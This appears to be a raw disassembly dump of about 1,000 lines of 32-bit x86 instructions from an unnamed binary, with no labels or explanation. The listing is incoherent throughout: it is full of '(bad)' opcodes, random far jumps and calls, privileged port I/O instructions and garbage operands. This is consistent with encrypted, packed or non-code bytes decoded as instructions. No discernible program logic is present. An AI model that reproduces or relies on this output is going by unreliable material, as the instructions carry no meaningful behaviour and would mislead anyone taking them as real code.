  41dea8:	jnp    0x41ded0
  41deaa:	retf   
  41deab:	push   esp
  41deac:	(bad)  
  41dead:	push   ds
  41deae:	into   
  41deaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deb0:	or     ch,BYTE PTR [edi]
  41deb2:	inc    esi
  41deb3:	push   0x5c7bd25e
  41deb8:	repnz push ebp
  41deba:	adc    ch,BYTE PTR [eax]
  41debc:	test   al,0xa4
  41debe:	xchg   edx,eax
  41debf:	xchg   ebp,eax
  41dec0:	repnz repnz test eax,0xb894a0f
  41dec7:	aaa    
  41dec8:	sbb    eax,0x1537e6a9
  41decd:	cld    
  41dece:	in     al,0x57
  41ded0:	and    dl,bh
  41ded2:	outs   dx,BYTE PTR ds:[esi]
  41ded3:	push   cs
  41ded4:	cmp    cl,BYTE PTR ds:0xbbb2cedb
  41deda:	inc    ecx
  41dedb:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dedd:	jle    0x41de86
  41dedf:	mov    edi,0x375b7248
  41dee4:	mov    al,BYTE PTR [ebx-0x28]
  41dee7:	stos   BYTE PTR es:[edi],al
  41dee8:	sub    BYTE PTR [eax-0x7e5a431f],dh
  41deee:	mov    edi,DWORD PTR [esi+eiz*8-0x3602426c]
  41def5:	mov    ch,0x60
  41def7:	outs   dx,DWORD PTR ds:[esi]
  41def8:	fucomip st,st(6)
  41defa:	pop    ss
  41defb:	mov    bl,0x76
  41defd:	and    dh,BYTE PTR [eax-0x6a]
  41df00:	mov    edx,0x85e836ac
  41df05:	sbb    BYTE PTR [ecx-0x29afcfce],bl
  41df0b:	loop   0x41decf
  41df0d:	rcr    BYTE PTR [eax+edi*2],1
  41df10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df11:	sbb    BYTE PTR [edi+0x6a],ah
  41df14:	(bad)  [ecx]
  41df16:	sbb    al,0x67
  41df18:	cmp    al,0x39
  41df1a:	sub    DWORD PTR [esi+eax*4],esi
  41df1d:	sub    BYTE PTR [ebx+0x4871ac3e],bh
  41df23:	test   DWORD PTR [ecx-0x22ad26fb],esp
  41df29:	mov    al,0x57
  41df2b:	lds    ebx,FWORD PTR [ebx+ebx*8]
  41df2e:	adc    edx,eax
  41df30:	push   es
  41df31:	leave  
  41df32:	cmc    
  41df33:	clc    
  41df34:	fisubr WORD PTR [edx+0x7c]
  41df37:	pop    esi
  41df38:	bound  eax,QWORD PTR [edx]
  41df3a:	idiv   BYTE PTR [ebx-0x43134f9b]
  41df40:	jb     0x41dec2
  41df42:	scas   al,BYTE PTR es:[edi]
  41df43:	sbb    eax,0xe1adea9d
  41df48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df49:	retf   0xa50e
  41df4c:	int3   
  41df4d:	ror    BYTE PTR [esp+eiz*2+0x5e0d4952],0x7
  41df55:	jmp    0x93ce:0xa4b47672
  41df5c:	mov    eax,edx
  41df5e:	cmp    dl,BYTE PTR [ebx-0x4]
  41df61:	call   0x979b:0x639e5a41
  41df68:	inc    edi
  41df69:	mov    esi,0x4c38cd39
  41df6e:	pop    ebp
  41df6f:	jae    0x41dfa6
  41df71:	sbb    dh,BYTE PTR [ebx]
  41df73:	push   cs
  41df74:	into   
  41df75:	or     DWORD PTR [ebx+0x1aae7895],ebp
  41df7b:	or     bl,cl
  41df7d:	xchg   esi,eax
  41df7e:	add    ebx,DWORD PTR [ecx-0x6a57035a]
  41df84:	sbb    DWORD PTR [ecx],eax
  41df86:	xor    BYTE PTR [ebx+0xea944e0],cl
  41df8c:	adc    ecx,esi
  41df8e:	cli    
  41df8f:	push   eax
  41df90:	pop    ecx
  41df91:	xchg   ecx,eax
  41df92:	outs   dx,DWORD PTR ds:[esi]
  41df93:	cmp    BYTE PTR [esi],0x76
  41df96:	xor    BYTE PTR [ebp+0x45],bh
  41df99:	cmp    al,0xd4
  41df9b:	xlat   BYTE PTR ds:[ebx]
  41df9c:	fsubr  QWORD PTR [esi+0x63cfd4a1]
  41dfa2:	mov    ebx,0xa92e34c9
  41dfa7:	pop    ebx
  41dfa8:	lods   eax,DWORD PTR ds:[esi]
  41dfa9:	call   DWORD PTR [edx+ecx*8]
  41dfac:	fs push ebp
  41dfae:	push   ds
  41dfaf:	xchg   esp,eax
  41dfb0:	push   ebx
  41dfb1:	lds    esi,FWORD PTR [edx-0x71]
  41dfb4:	mov    eax,0xaa01a0
  41dfb9:	mov    al,ds:0xc46a2c49
  41dfbe:	repz mov edi,0xc87fe634
  41dfc4:	mov    bl,0xae
  41dfc6:	ins    BYTE PTR es:[edi],dx
  41dfc7:	test   al,0x8e
  41dfc9:	retf   
  41dfca:	add    esi,esp
  41dfcc:	call   0x6ff:0x23f9b179
  41dfd3:	jecxz  0x41e005
  41dfd5:	jge    0x41e044
  41dfd7:	call   0xa634ee02
  41dfdc:	retf   
  41dfdd:	in     eax,0xc4
  41dfdf:	daa    
  41dfe0:	xchg   DWORD PTR [edi-0x2abe2695],ebx
  41dfe6:	add    al,0x7d
  41dfe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfe9:	push   esi
  41dfea:	es and al,0xa5
  41dfed:	clc    
  41dfee:	inc    ebp
  41dfef:	cmp    al,0xf9
  41dff1:	mov    DWORD PTR ds:0xb08fb598,eax
  41dff7:	mov    esi,0xf0f38b68
  41dffc:	dec    edi
  41dffd:	mov    WORD PTR [ecx+0x56],fs
  41e000:	lea    eax,[edi-0x3c]
  41e003:	pop    esp
  41e004:	aam    0x59
  41e006:	cmp    eax,0xe715f7dc
  41e00b:	dec    esi
  41e00c:	pop    edi
  41e00d:	mov    WORD PTR [ebp+0x13515573],fs
  41e013:	into   
  41e014:	add    al,0x1
  41e016:	and    al,0x22
  41e018:	mov    bh,0x85
  41e01a:	jmp    0x4746d821
  41e01f:	outs   dx,DWORD PTR ds:[esi]
  41e020:	cmc    
  41e021:	nop
  41e022:	outs   dx,DWORD PTR ds:[esi]
  41e023:	xchg   ebp,eax
  41e024:	jmp    0x4fe6:0x770ac6c7
  41e02b:	sub    DWORD PTR [ebx+0x62176ec1],0xf1a56c5f
  41e035:	jmp    0x8ac92ceb
  41e03a:	lods   al,BYTE PTR ds:[esi]
  41e03b:	pop    ss
  41e03c:	xor    al,0x65
  41e03e:	addr16 xchg ebp,eax
  41e040:	in     al,0x62
  41e042:	mov    eax,ds:0x3da075be
  41e047:	push   ecx
  41e048:	test   DWORD PTR [ecx+edx*8+0x156a47ed],edi
  41e04f:	xchg   esi,eax
  41e050:	cdq    
  41e051:	xchg   DWORD PTR [edx],esi
  41e053:	loop   0x41e01d
  41e055:	mov    WORD PTR ds:0x6fe22620,?
  41e05b:	jo     0x41e09f
  41e05d:	test   al,0x7c
  41e05f:	fsubr  QWORD PTR [ecx-0x67]
  41e062:	and    esi,DWORD PTR [ebx-0x39573e6]
  41e068:	or     eax,0x3a6f9730
  41e06d:	push   0x7d
  41e06f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e070:	lods   al,BYTE PTR ds:[esi]
  41e071:	push   0x3e072ed9
  41e076:	ja     0x41e056
  41e078:	pop    ebx
  41e079:	addr16 popf 
  41e07b:	sub    dh,dl
  41e07d:	mov    ebp,0x97b0ede4
  41e082:	mov    edx,esi
  41e084:	cwde   
  41e085:	mov    esp,gs
  41e087:	leave  
  41e088:	std    
  41e089:	ret    
  41e08a:	sbb    BYTE PTR [esp+edi*1+0x6f],bh
  41e08e:	pop    ebx
  41e08f:	dec    esp
  41e090:	jle    0x41e10e
  41e092:	mov    al,ds:0x452a88b6
  41e097:	xchg   edi,eax
  41e098:	mov    bh,dh
  41e09a:	test   DWORD PTR [edi-0x5b],esi
  41e09d:	jle    0x41e074
  41e09f:	neg    BYTE PTR ds:0xe8f45c14
  41e0a5:	adc    dh,BYTE PTR [edx*1+0x6901a49c]
  41e0ac:	lea    ebp,[esi-0x9]
  41e0af:	jl     0x41e110
  41e0b1:	mov    ch,0x12
  41e0b3:	pop    edx
  41e0b4:	aaa    
  41e0b5:	div    BYTE PTR [ebp-0x7d9d2922]
  41e0bb:	push   esi
  41e0bc:	ja     0x41e0da
  41e0be:	adc    edx,DWORD PTR [esi+ebx*8+0x3e]
  41e0c2:	sub    bl,BYTE PTR [edx-0x10]
  41e0c5:	(bad)
  41e0c8:	pop    edi
  41e0c9:	arpl   WORD PTR [edx-0x74],si
  41e0cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0cd:	cmp    eax,0x13db5677
  41e0d2:	or     edi,eax
  41e0d4:	cmp    DWORD PTR [edx+0x5f],ecx
  41e0d7:	into   
  41e0d8:	dec    esi
  41e0d9:	cs push ds
  41e0db:	inc    ebx
  41e0dc:	inc    esi
  41e0dd:	fadd   st(0),st
  41e0df:	fwait
  41e0e0:	out    0xff,al
  41e0e2:	mov    esp,0xaaf927d
  41e0e7:	ds cmp al,0x33
  41e0ea:	xchg   edx,edi
  41e0ec:	in     eax,0xd2
  41e0ee:	outs   dx,BYTE PTR ds:[esi]
  41e0ef:	mov    dh,0x6c
  41e0f1:	sub    DWORD PTR [ebx-0x12],ebp
  41e0f4:	faddp  st(0),st
  41e0f6:	fldlg2 
  41e0f8:	mov    eax,ds:0x75380e2b
  41e0fd:	push   es
  41e0fe:	and    DWORD PTR [ebx],0xffffff83
  41e101:	jecxz  0x41e178
  41e103:	dec    ecx
  41e104:	pusha  
  41e105:	jmp    0x41e166
  41e107:	or     cl,ch
  41e109:	popf   
  41e10a:	dec    edi
  41e10b:	call   0x3d6b5b09
  41e110:	das    
  41e111:	cdq    
  41e112:	aas    
  41e113:	les    esp,FWORD PTR [edi]
  41e115:	sbb    eax,0x777fee7d
  41e11a:	ficomp WORD PTR [esi+ebp*1]
  41e11d:	fs enter 0x2620,0xce
  41e122:	push   ds
  41e123:	xor    al,0x5d
  41e125:	or     eax,0xa21ae215
  41e12a:	xlat   BYTE PTR ds:[ebx]
  41e12b:	adc    edi,DWORD PTR [esp+ebp*8+0x534a73a3]
  41e132:	outs   dx,DWORD PTR ds:[esi]
  41e133:	add    al,0xea
  41e136:	xchg   edi,eax
  41e137:	test   eax,0xdbee8f36
  41e13c:	jb     0x41e161
  41e13e:	xchg   esi,eax
  41e13f:	mov    esi,0xbbef88f7
  41e144:	dec    esp
  41e145:	ret    
  41e146:	push   ds
  41e147:	ret    
  41e148:	sahf   
  41e149:	int    0x19
  41e14b:	mov    edx,0x99fad5f1
  41e150:	div    BYTE PTR [esp+edx*1+0x3e]
  41e154:	mov    eax,ds:0x47b4bc4
  41e159:	sub    BYTE PTR [edi+edi*1+0x65c176ce],0x33
  41e161:	mov    edx,0x8a40c05e
  41e166:	ss dec edi
  41e168:	mov    ebp,0xcfb39c7f
  41e16d:	mov    ebp,0xf765a059
  41e172:	clc    
  41e173:	xor    edx,edi
  41e175:	and    bl,al
  41e177:	xor    DWORD PTR [edx+0x219f9e5],0x5fd4f15e
  41e181:	jns    0x41e106
  41e183:	mov    dh,0x22
  41e185:	jo     0x41e166
  41e187:	loopne 0x41e1b5
  41e189:	xchg   ebx,eax
  41e18a:	adc    DWORD PTR [eax-0x6e],ecx
  41e18d:	and    al,0xae
  41e18f:	push   ds
  41e190:	in     eax,0x47
  41e192:	aam    0xb6
  41e194:	and    DWORD PTR [ecx+0x2e],edi
  41e197:	in     al,0xde
  41e199:	mov    ds:0x850b0ef8,al
  41e19e:	(bad)  
  41e19f:	stos   BYTE PTR es:[edi],al
  41e1a0:	sub    dh,BYTE PTR [esi+0x383f9dd5]
  41e1a6:	scas   al,BYTE PTR es:[edi]
  41e1a7:	jmp    0x264de1e1
  41e1ac:	mov    esp,DWORD PTR [eax-0x448124a9]
  41e1b2:	cmp    DWORD PTR [ebx+0x28932892],0xffffff8a
  41e1b9:	xchg   edi,eax
  41e1ba:	mov    eax,0x18f1142c
  41e1bf:	pushf  
  41e1c0:	fsub   DWORD PTR [esi-0x33973f5b]
  41e1c6:	mov    ds:0x25216d0,eax
  41e1cb:	int    0xdb
  41e1cd:	mov    ebp,0x449ba026
  41e1d2:	sbb    DWORD PTR ds:0x57e4f790,ebx
  41e1d8:	int    0xa5
  41e1da:	or     eax,DWORD PTR [eax+ecx*8+0x1d]
  41e1de:	xchg   ebp,eax
  41e1df:	xchg   edx,eax
  41e1e0:	sub    al,0x66
  41e1e2:	xchg   esi,eax
  41e1e3:	in     eax,0x99
  41e1e5:	inc    esi
  41e1e6:	and    dh,BYTE PTR [eax-0x1e]
  41e1e9:	cli    
  41e1ea:	mov    eax,ds:0xd4f57183
  41e1ef:	outs   dx,BYTE PTR ds:[esi]
  41e1f0:	hlt    
  41e1f1:	imul   esp,DWORD PTR [esi+eiz*8],0xffffffd4
  41e1f5:	cld    
  41e1f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1f7:	ja     0x41e184
  41e1f9:	call   DWORD PTR [ebx]
  41e1fb:	ret    
  41e1fc:	rcr    BYTE PTR [ebx],1
  41e1fe:	cdq    
  41e1ff:	data16 fsubr st,st(2)
  41e202:	push   ds
  41e203:	mov    ah,0x3
  41e205:	add    dh,BYTE PTR ss:0x256b
  41e20b:	pop    edx
  41e20c:	jecxz  0x41e1cf
  41e20e:	sub    BYTE PTR [edx+edi*8-0x629ca84b],bh
  41e215:	push   eax
  41e216:	jp     0x41e25b
  41e218:	das    
  41e219:	dec    esi
  41e21a:	mov    ebp,0xd36a2596
  41e21f:	xor    esp,0x8abcaf03
  41e225:	jo     0x41e216
  41e227:	inc    esp
  41e228:	jmp    0x41e275
  41e22a:	nop
  41e22b:	cmp    DWORD PTR [ecx+ebp*2],esp
  41e22e:	add    eax,0x8f5110af
  41e233:	loopne 0x41e1de
  41e235:	stc    
  41e236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e237:	ins    BYTE PTR es:[edi],dx
  41e238:	(bad)  
  41e23b:	sbb    al,0x6
  41e23d:	sub    cl,BYTE PTR [ecx+ebx*4-0x43]
  41e241:	mov    BYTE PTR [ecx+0x1304e520],0x28
  41e248:	adc    BYTE PTR [ecx+0x13],0x76
  41e24c:	out    dx,eax
  41e24d:	into   
  41e24e:	je     0x41e220
  41e250:	rcl    DWORD PTR ds:0xcb34f35c,0x2b
  41e257:	test   DWORD PTR ds:0xe57927dc,esi
  41e25d:	inc    bh
  41e25f:	aad    0xd3
  41e261:	ror    BYTE PTR [ebx],0x73
  41e264:	inc    eax
  41e265:	fnstenv [ecx+0x57b98980]
  41e26b:	out    0xe2,al
  41e26d:	imul   edx,ebx,0x3f69ae99
  41e273:	pop    edx
  41e274:	sbb    bh,BYTE PTR [esi]
  41e276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e277:	stos   BYTE PTR es:[edi],al
  41e278:	sti    
  41e279:	pop    ss
  41e27a:	inc    esp
  41e27b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e27c:	imul   BYTE PTR [esp+ecx*2]
  41e27f:	jge    0x41e29f
  41e281:	sar    DWORD PTR [ecx-0x52],cl
  41e284:	xchg   edi,eax
  41e285:	xor    dl,BYTE PTR [ebp+0x24]
  41e288:	adc    BYTE PTR [eax-0x295ef58e],bh
  41e28e:	add    dl,BYTE PTR [edi-0x6e]
  41e291:	popa   
  41e292:	cli    
  41e293:	lods   eax,DWORD PTR ds:[esi]
  41e294:	or     cl,BYTE PTR [esi]
  41e296:	in     eax,0x6c
  41e298:	addr16 sub ebx,esp
  41e29b:	ret    
  41e29c:	iret   
  41e29d:	cmp    eax,0x8cfa607a
  41e2a2:	cmp    edi,DWORD PTR [edx-0x2]
  41e2a5:	mov    ch,0x33
  41e2a7:	inc    esp
  41e2a8:	pusha  
  41e2a9:	and    BYTE PTR [edx+eax*8+0x5a],al
  41e2ad:	(bad)  
  41e2ae:	fidivr WORD PTR [edi+0x73]
  41e2b1:	icebp  
  41e2b2:	or     eax,0x96fa9c99
  41e2b7:	xchg   DWORD PTR [esi+0x6c732520],ecx
  41e2bd:	inc    edi
  41e2be:	loope  0x41e2b2
  41e2c0:	repz in al,0x95
  41e2c3:	popa   
  41e2c4:	shl    BYTE PTR cs:[ebx],1
  41e2c7:	loop   0x41e2a4
  41e2c9:	sub    edx,DWORD PTR [edx]
  41e2cb:	xchg   dl,dh
  41e2cd:	cmp    DWORD PTR [ecx+ebx*8],esi
  41e2d0:	(bad)  
  41e2d1:	out    0x36,al
  41e2d3:	mov    bl,BYTE PTR [edi+0x1a]
  41e2d6:	inc    eax
  41e2d7:	jge    0x41e350
  41e2d9:	xor    BYTE PTR ds:0xd5fbb53c,dh
  41e2df:	dec    edi
  41e2e0:	fist   DWORD PTR [ebx]
  41e2e2:	imul   esp,DWORD PTR [edx-0x9],0x54
  41e2e6:	cld    
  41e2e7:	clc    
  41e2e8:	test   DWORD PTR [edi+0x2d010e48],ebp
  41e2ee:	mov    eax,ds:0x77bdfe21
  41e2f3:	mov    esi,DWORD PTR ss:[esi-0x1161671a]
  41e2fa:	push   es
  41e2fb:	mov    cl,0x28
  41e2fd:	popa   
  41e2fe:	les    ecx,FWORD PTR [ebx]
  41e300:	lock sar DWORD PTR [edx],0xb4
  41e304:	add    BYTE PTR [edi],0xc1
  41e307:	or     al,0x2e
  41e309:	xor    eax,0xe1516749
  41e30e:	add    ah,BYTE PTR [edi]
  41e310:	or     ah,0x67
  41e313:	mov    ecx,cs
  41e315:	cmp    BYTE PTR [ebx+0x73af7264],cl
  41e31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e31c:	in     eax,dx
  41e31d:	mov    BYTE PTR [ebp+0x56fe05a],cl
  41e323:	xchg   ebx,eax
  41e324:	test   BYTE PTR [eax+0x1e],cl
  41e327:	fcom   DWORD PTR [edx-0x7f]
  41e32a:	gs dec edi
  41e32c:	dec    esi
  41e32d:	js     0x41e335
  41e32f:	inc    edx
  41e330:	jg     0x41e384
  41e332:	mov    dl,BYTE PTR [ecx]
  41e334:	shl    DWORD PTR [edi],1
  41e336:	jnp    0x41e378
  41e338:	dec    ebp
  41e339:	sub    DWORD PTR [eax+0x18],ecx
  41e33c:	pop    es
  41e33d:	jo     0x41e2ee
  41e33f:	test   BYTE PTR [ebx+0x23],dl
  41e342:	jg     0x41e38f
  41e344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e345:	outs   dx,DWORD PTR ds:[esi]
  41e346:	cld    
  41e347:	jle    0x41e2cf
  41e349:	stos   BYTE PTR es:[edi],al
  41e34a:	and    ecx,ebp
  41e34c:	sub    cl,BYTE PTR [esi]
  41e34e:	mov    al,ds:0x62d32a2e
  41e353:	sti    
  41e354:	jb     0x41e3b4
  41e356:	ss ds std 
  41e359:	adc    al,0xba
  41e35b:	std    
  41e35c:	mov    ebx,0x345b330c
  41e361:	sbb    al,0xab
  41e363:	bound  ebp,QWORD PTR [ebx+ecx*4-0x1e2b4fa9]
  41e36a:	pop    edx
  41e36b:	cmp    bh,BYTE PTR [esi]
  41e36d:	(bad)  
  41e36e:	mov    al,ds:0x22d17bf
  41e373:	sub    eax,0xd1a28f0c
  41e378:	cmp    eax,0x18e1581a
  41e37d:	fstp   QWORD PTR [ebp+eax*4+0x19c1e6fe]
  41e384:	jbe    0x41e388
  41e386:	pop    ss
  41e387:	sub    DWORD PTR [ebx+edi*1],ebx
  41e38a:	mov    al,0x84
  41e38c:	push   0x72
  41e38e:	pop    ss
  41e38f:	and    al,0xe7
  41e391:	(bad)  
  41e392:	out    0x25,al
  41e394:	daa    
  41e395:	sar    BYTE PTR [edx],1
  41e397:	push   es
  41e398:	lahf   
  41e399:	dec    ebx
  41e39a:	mov    BYTE PTR [esi+0x4f8cb2b4],ah
  41e3a0:	stos   DWORD PTR es:[edi],eax
  41e3a1:	xor    esp,DWORD PTR [esi]
  41e3a3:	push   ds
  41e3a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3a5:	rol    bh,1
  41e3a7:	stos   DWORD PTR es:[edi],eax
  41e3a8:	mov    ds:0x5b695263,al
  41e3ad:	imul   ecx,DWORD PTR [ecx+ebp*8],0xffffffa1
  41e3b1:	xor    bh,dh
  41e3b3:	pop    edx
  41e3b4:	mov    esp,0xe1b134ba
  41e3b9:	or     ch,BYTE PTR cs:[edx-0x200ccd07]
  41e3c0:	dec    edx
  41e3c1:	loopne 0x41e3d9
  41e3c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3c4:	add    DWORD PTR [esi+edi*2+0x15],esi
  41e3c8:	data16 mov bh,0xf6
  41e3cb:	fistp  DWORD PTR [edx]
  41e3cd:	je     0x41e3ed
  41e3cf:	mov    ah,BYTE PTR [edi]
  41e3d1:	retf   
  41e3d2:	push   cs
  41e3d3:	pusha  
  41e3d4:	gs mov edi,0xe7d54290
  41e3da:	cmp    eax,0x3f1c48f9
  41e3df:	add    DWORD PTR ds:0x741b9c41,0xffffffa7
  41e3e6:	lock push esi
  41e3e8:	ja     0x41e3cd
  41e3ea:	repz jle 0x41e3e2
  41e3ed:	inc    ecx
  41e3ee:	cs scas al,BYTE PTR es:[edi]
  41e3f0:	lods   eax,DWORD PTR ds:[esi]
  41e3f1:	push   0x407daf98
  41e3f6:	shr    DWORD PTR [ebp-0xfc4bd1b],cl
  41e3fc:	pop    eax
  41e3fd:	sar    BYTE PTR [ebx],1
  41e3ff:	push   ss
  41e400:	mov    ecx,DWORD PTR [ebx]
  41e402:	jbe    0x41e43b
  41e404:	mov    edi,0xd7ff8d99
  41e409:	dec    edi
  41e40a:	out    0xa,al
  41e40c:	mov    dh,BYTE PTR [esi+ebx*4]
  41e40f:	sub    BYTE PTR [eax],dl
  41e411:	mov    ah,0xcd
  41e413:	mov    esp,DWORD PTR [ebp-0x1f7e43f4]
  41e419:	test   DWORD PTR [ebp+0x764e18af],eax
  41e41f:	and    DWORD PTR ds:0x4ebd4b18,ebx
  41e425:	jp     0x41e3ff
  41e427:	inc    edx
  41e428:	jmp    0x41e46b
  41e42a:	xlat   BYTE PTR ds:[ebx]
  41e42b:	dec    ebp
  41e42c:	pushf  
  41e42d:	mov    WORD PTR [esi],ss
  41e42f:	xchg   edi,eax
  41e430:	push   cs
  41e431:	iret   
  41e432:	push   es
  41e433:	ja     0x41e488
  41e435:	cli    
  41e436:	daa    
  41e437:	add    al,0x69
  41e439:	mov    al,ds:0xc14ba10a
  41e43e:	icebp  
  41e43f:	jbe    0x41e49f
  41e441:	pop    ebp
  41e442:	add    eax,0x8071dccf
  41e447:	call   0xe4c998e0
  41e44c:	cmp    DWORD PTR [edi-0x4c4f9743],esp
  41e452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e453:	sbb    BYTE PTR [edi+eiz*4],al
  41e456:	stos   DWORD PTR es:[edi],eax
  41e457:	into   
  41e458:	add    ebp,ebp
  41e45a:	mov    dl,BYTE PTR [ebp-0x130760a4]
  41e460:	sub    esp,DWORD PTR [eax-0x4b]
  41e463:	ret    
  41e464:	inc    ecx
  41e465:	rcr    BYTE PTR [ebp-0x19],0xbc
  41e469:	push   edx
  41e46a:	jo     0x41e4d1
  41e46c:	test   BYTE PTR [ebx+ebp*2],al
  41e46f:	fisub  DWORD PTR [esi+ecx*2-0x53]
  41e473:	mov    DWORD PTR [esi+0x159d7afb],edx
  41e479:	ss js  0x41e4a2
  41e47c:	(bad)  
  41e47d:	std    
  41e47e:	shl    BYTE PTR [ebp+0x5dd68dfd],cl
  41e484:	dec    esi
  41e485:	mov    ecx,0xe78818de
  41e48a:	jo     0x41e465
  41e48c:	(bad)  
  41e48d:	aas    
  41e48e:	bound  eax,QWORD PTR [ecx+0x58]
  41e491:	mov    eax,ds:0x7d6f4e64
  41e496:	je     0x41e4b0
  41e498:	dec    ebp
  41e499:	mov    ch,BYTE PTR [esp+ebx*4+0x5a315120]
  41e4a0:	test   BYTE PTR [edi],al
  41e4a2:	lea    edi,[ebx-0x6c]
  41e4a5:	(bad)  
  41e4a6:	xor    al,ch
  41e4a8:	fwait
  41e4a9:	jp     0x41e496
  41e4ab:	cmp    eax,0x1b58c67e
  41e4b0:	pop    ebx
  41e4b1:	rol    bh,cl
  41e4b3:	ret    0x2884
  41e4b6:	and    al,0x56
  41e4b8:	jp     0x41e4f3
  41e4ba:	(bad)  
  41e4bb:	xchg   esp,eax
  41e4bc:	vpcmpgtw ymm4,ymm2,YMMWORD PTR [ecx-0x78]
  41e4c1:	jns    0x41e4c4
  41e4c3:	sub    ebp,DWORD PTR [ebx]
  41e4c5:	std    
  41e4c6:	out    0xe6,al
  41e4c8:	and    DWORD PTR [edi],edi
  41e4ca:	push   edx
  41e4cb:	dec    esi
  41e4cc:	pop    es
  41e4cd:	cli    
  41e4ce:	mov    eax,0xe55bb6ff
  41e4d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4d4:	je     0x41e472
  41e4d6:	fwait
  41e4d7:	mov    ch,0xa9
  41e4d9:	xor    eax,0xb7bbd577
  41e4de:	mov    esp,0xfc8a3a8f
  41e4e3:	pop    ecx
  41e4e4:	add    eax,0xc47471a8
  41e4e9:	mov    fs,WORD PTR [eax+ebp*4]
  41e4ec:	dec    edx
  41e4ed:	ins    BYTE PTR es:[edi],dx
  41e4ee:	sbb    DWORD PTR [ecx+0x3d81cabc],0x6f
  41e4f5:	xor    eax,0xa994ba1c
  41e4fa:	mov    dh,0xec
  41e4fc:	push   eax
  41e4fd:	mov    ecx,0xfa46ad04
  41e502:	sbb    al,0xe8
  41e504:	push   0x5b
  41e506:	xor    DWORD PTR [ecx-0x41f3154a],eax
  41e50c:	xor    BYTE PTR [edi-0x79],ah
  41e50f:	retf   0x6c2d
  41e512:	lea    eax,ds:0x8c32b4bf
  41e518:	xchg   ebx,eax
  41e519:	sub    al,0x13
  41e51b:	ja     0x41e4e6
  41e51d:	push   0xffffff95
  41e51f:	pop    eax
  41e520:	dec    ebx
  41e521:	jmp    0x41e526
  41e523:	call   0x8d0da741
  41e528:	loop   0x41e5a7
  41e52a:	test   BYTE PTR [esi],bl
  41e52c:	(bad)  
  41e52d:	ja     0x41e4e5
  41e52f:	ds xchg edi,eax
  41e531:	and    ebx,DWORD PTR [eax-0x3e]
  41e534:	mov    BYTE PTR [edx+0x13],bh
  41e537:	inc    edx
  41e538:	test   bl,al
  41e53a:	sub    DWORD PTR [ecx-0x30],0xf3e00a56
  41e541:	aad    0x7
  41e543:	mov    ecx,0xd611ba91
  41e548:	les    edx,FWORD PTR [ecx-0x79]
  41e54b:	arpl   sp,si
  41e54d:	test   BYTE PTR [ebp-0xf72a44a],0x25
  41e554:	rol    DWORD PTR [ecx+0x1758dab8],cl
  41e55a:	sti    
  41e55b:	sub    BYTE PTR [ebx+0x2fdb2676],ch
  41e561:	inc    eax
  41e562:	pop    esi
  41e563:	xchg   esi,eax
  41e564:	pop    edx
  41e565:	jl     0x41e5de
  41e567:	xor    al,0xec
  41e569:	pop    edx
  41e56a:	sub    ebp,ecx
  41e56c:	mov    dl,0x20
  41e56e:	inc    ebx
  41e56f:	sbb    DWORD PTR [edi],ecx
  41e571:	jg     0x41e563
  41e573:	fbld   TBYTE PTR [edx+0x6414166d]
  41e579:	push   eax
  41e57a:	pop    es
  41e57b:	and    BYTE PTR [esp+ebx*4-0x1b5b541b],al
  41e582:	fisub  WORD PTR [eax-0x4a]
  41e585:	mov    al,0x32
  41e587:	(bad)  
  41e589:	out    0x2c,al
  41e58b:	push   DWORD PTR [edi+0x1c75c1b0]
  41e591:	dec    esp
  41e592:	mov    BYTE PTR [esi+0x76],cl
  41e595:	fld    DWORD PTR [ecx-0x24]
  41e598:	int3   
  41e599:	dec    esp
  41e59a:	or     BYTE PTR [esi],ch
  41e59c:	add    ebp,DWORD PTR [ebp+0x2da78303]
  41e5a2:	call   FWORD PTR [ebp+0x2c]
  41e5a5:	jo     0x41e597
  41e5a7:	mov    DWORD PTR [eax-0x4d6ec52],ebx
  41e5ad:	mov    ?,WORD PTR [ecx+0x2f]
  41e5b0:	sub    DWORD PTR [eax-0x70],edx
  41e5b3:	call   0x9894e9c0
  41e5b8:	mov    edi,0x493fd1a3
  41e5bd:	rol    DWORD PTR ds:0xd41e4564,0x84
  41e5c4:	cli    
  41e5c5:	lods   al,BYTE PTR ds:[esi]
  41e5c6:	add    al,0xe6
  41e5c8:	pop    ds
  41e5c9:	inc    edx
  41e5ca:	sub    ebp,DWORD PTR [edi-0x4b]
  41e5cd:	cmc    
  41e5ce:	xor    BYTE PTR [edx+0x2bd32c35],ah
  41e5d4:	mov    ch,0x39
  41e5d6:	mov    esp,0x66574518
  41e5db:	int3   
  41e5dc:	pop    ebp
  41e5dd:	mov    edx,eax
  41e5df:	jecxz  0x41e606
  41e5e1:	cld    
  41e5e2:	out    0xf6,eax
  41e5e4:	or     bl,bh
  41e5e6:	push   0xcd34e8f
  41e5eb:	dec    edx
  41e5ec:	mov    bl,dh
  41e5ee:	pop    esp
  41e5ef:	add    BYTE PTR [edi+0x0],0x44
  41e5f3:	mov    eax,0x665e0efb
  41e5f8:	sub    eax,0xd4cfafbe
  41e5fd:	push   esi
  41e5fe:	mov    eax,0xd406744e
  41e603:	xor    BYTE PTR ds:0x86e844f2,al
  41e609:	int    0xc
  41e60b:	pop    edi
  41e60c:	shl    bl,cl
  41e60e:	stos   DWORD PTR es:[edi],eax
  41e60f:	and    BYTE PTR [ecx+0x13],cl
  41e612:	shl    DWORD PTR [edi+edx*8+0xb],0xfa
  41e617:	sub    DWORD PTR [eax-0x36],ebp
  41e61a:	adc    al,0x3a
  41e61c:	ret    0x96a8
  41e61f:	addr16 ret 0xbae5
  41e623:	arpl   WORD PTR [edi+edx*2],sp
